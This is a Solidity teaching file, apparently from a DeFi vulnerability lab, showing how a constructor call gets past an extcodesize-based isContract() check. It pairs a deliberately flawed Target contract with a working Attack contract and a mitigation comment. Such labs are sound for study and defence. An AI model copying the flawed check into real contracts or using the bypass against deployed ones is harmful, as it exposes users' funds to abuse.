// SPDX-License-Identifier: MIT
// Source: https://github.com/SunWeb3Sec/DeFiVulnLabs
// Vulnerability: Bypass isContract() Check
pragma solidity ^0.8.18;

/*
Name: Bypass isContract() validation

Description:
The attacker can bypass isContract() detection by executing code in the constructor
of a smart contract. During construction, extcodesize returns 0.

Mitigation:
Don't rely on isContract() checks for security-critical logic.
Use tx.origin == msg.sender for EOA-only functions (with awareness of its limitations).
*/

contract Target {
    // VULNERABILITY: Can be bypassed during contract construction
    function isContract(address account) public view returns (bool) {
        uint size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    bool public pwned = false;

    function protected() external {
        require(!isContract(msg.sender), "no contract allowed");
        pwned = true;
    }
}

// Attack: Call protected() from constructor when extcodesize is 0
contract Attack {
    bool public isContract;
    address public addr;

    constructor(address _target) {
        // During construction, extcodesize(this) == 0
        isContract = Target(_target).isContract(address(this));
        addr = address(this);
        Target(_target).protected();  // Bypasses the check
    }
}
